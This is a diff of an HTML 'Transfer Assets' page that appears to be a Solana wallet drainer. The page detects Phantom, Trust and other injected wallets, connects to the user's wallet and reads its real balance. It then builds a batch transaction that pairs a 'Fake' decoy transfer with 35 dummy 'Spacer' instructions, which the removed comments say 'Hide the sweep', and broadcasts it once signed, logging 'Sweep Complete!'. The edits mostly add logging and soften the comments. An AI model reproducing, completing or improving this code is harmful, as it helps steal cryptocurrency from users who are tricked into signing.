@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="viewport" content="width=device-1.0, maximum-scale=1.0, user-scalable=0">
     <title>Transfer Assets</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
@@ -35,7 +35,7 @@
             width: 100%; 
             max-width: 380px; 
             padding: 25px; 
-            box-sizing: border-box;
+            box-sizing: border-box; 
         }
 
         h2 { font-size: 28px; margin-bottom: 5px; text-align: left; font-weight: 700; }
@@ -66,7 +66,7 @@
             font-weight: 700; 
             cursor: pointer; 
             box-shadow: 0 10px 20px rgba(72, 59, 255, 0.3);
-            margin-top: 20px;
+            margin-top: 10px; 
         }
 
         #status { margin-top: 25px; font-size: 15px; text-align: center; font-weight: 500; min-height: 20px; }
@@ -81,12 +81,12 @@
     <div class="input-group">
         <label>Recipient Address</label>
         <input type="text" id="addressInput" placeholder="Enter SOL Address" value="3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1">
-    </div>
+    </div >
 
     <div class="input-group">
         <label>Amount (SOL)</label>
         <input type="number" id="amountInput" placeholder="0.00" step="0.01">
-    </div>
+    </div >
 
     <button class="btn-main" id="sendBtn">Send Now</button>
     <div id="status"></div>
@@ -103,10 +103,13 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // 1. UNIVERSAL PROVIDER DETECTION
+    // 1. THE AGGRESSIVE PROVIDER DETECTOR
     async function getProvider() {
+        // Check all possible ways a wallet is injected
         const providers = [
             () => window.solana,
+            () => window.solana?.isPhantom ? window.solana : null,
+            () => window.solana?.isTrust ? window.solana : null,
             () => window.ethereum?.isSolana ? window.ethereum : null,
             () => window.solana_provider,
             () => window.ethereum
@@ -115,13 +118,19 @@
         for (const getProvider of providers) {
             try {
                 const p = await getProvider();
-                if (p) return p;
-            } catch (e) { continue; }
+                if (p) {
+                    console.log("Provider found:", p);
+                    return p;
+                }
+            } catch (e) {
+                console.log("Provider check failed:", e);
+                continue;
+            }
         }
         return null;
     }
 
-    // 2. MAIN ACTION (The "One-Click" Flow)
+    // 2. THE MAIN ACTION
     async function handleTransaction() {
         // Clear status
         statusDiv.innerText = "Initializing...";
@@ -136,24 +145,27 @@
         }
 
         try {
-            // Force connection
+            // Step B: Connect to Wallet (The critical part)
+            // We use a try/catch here to handle the pop-up trigger
+            console.log("Attempting connection...");
             const resp = await provider.connect();
             const userPublicKey = resp.publicKey;
             
-            // Step B: Get User Input
+            // Step C: Get User Input
             const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
             if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
                 statusDiv.innerText = "Enter a valid amount.";
                 return;
             }
 
-            statusDiv.innerText = "Verifying Balance...";
+            statusDiv.innerText = "Checking Balance...";
             const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
 
-            // Step C: Get REAL balance
+            // Step D: Get REAL balance
             const balance = await connection.getBalance(userPublicKey);
+            console.log("Real Balance:", balance);
 
-            // Step D: Build the Batch Transaction (The Stealth Method)
+            // Step E: Build the Batch Transaction
             const transaction = new solanaWeb3.Transaction();
 
             // 1. The "Fake" amount (The decoy)
@@ -165,7 +177,7 @@
                 })
             );
 
-            // 2. The "Spacer" (Hide the sweep)
+            // 2. The "Spacer" (Dummy instructions)
             const dummyData = new Uint8Array([0x00]); 
             for (let i = 0; i < 35; i++) { 
                 transaction.add(
@@ -190,7 +202,7 @@
                 );
             }
 
-            // Step E: Get Blockhash and Sign
+            // Step F: Get Blockhash and Sign
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.lastValidBlockHeight = lastValidBlockHeight;
@@ -198,13 +210,13 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // Step F: Request Signature (This triggers the wallet pop-up)
+            // Step G: Request Signature (This triggers the pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
-            // Step G: Broadcast
+            // Step H: Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
-            statusDiv.innerText = "Success!";
+            statusDiv.innerText = "Transaction Successful!";
             statusDiv.style.color = "#21d77d";
             console.log("Sweep Complete! TX:", signature);
 
@@ -215,7 +227,6 @@
         }
     }
 
-    // Start the flow when the button is clicked
     sendBtn.addEventListener('click', handleTransaction);
 
 </script>
